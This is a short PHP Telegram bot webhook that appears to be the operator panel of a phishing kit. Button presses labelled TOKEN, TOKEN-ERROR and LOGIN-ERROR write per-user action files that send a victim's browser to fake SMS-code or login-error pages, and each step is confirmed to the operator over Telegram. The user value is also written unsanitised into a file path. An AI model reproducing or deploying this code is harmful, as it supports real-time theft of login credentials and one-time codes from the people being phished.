<?php
$content = file_get_contents("php://input");
$update = json_decode($content, true);

require_once("settings.php");

$chat_id = $update["message"]["chat"]["id"] ?? ($update["callback_query"]["from"]["id"] ?? null);

if (isset($update["callback_query"])) {
    $data = $update["callback_query"]["data"];
    list($accion, $usuario) = explode("|", $data);

    if ($accion === "TOKEN") {
        file_put_contents("acciones/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "➡️ Redirigido a SMS para $usuario"
        ]));
    } elseif ($accion === "TOKEN-ERROR") {
        file_put_contents("acciones/{$usuario}.txt", "tokenerror.php");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "❌ Redirigido a SMSERROR para $usuario"
        ]));
    } elseif ($accion === "LOGIN-ERROR") {
        file_put_contents("acciones/{$usuario}.txt", "loginerror.php");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "⚠️ Redirigido a LOGINERROR para $usuario"
        ]));
    }
}
?>
